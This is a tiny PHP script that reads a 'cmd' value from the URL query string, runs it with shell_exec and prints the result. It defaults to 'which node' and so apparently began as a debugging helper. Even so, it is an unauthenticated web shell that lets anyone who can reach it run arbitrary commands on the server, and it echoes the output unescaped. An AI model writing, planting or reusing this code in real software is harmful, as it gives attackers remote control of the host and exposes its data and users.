<?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'which node';
echo "Running: $cmd\n";
$output = shell_exec($cmd . " 2>&1");
echo "<pre>$output</pre>";
?>
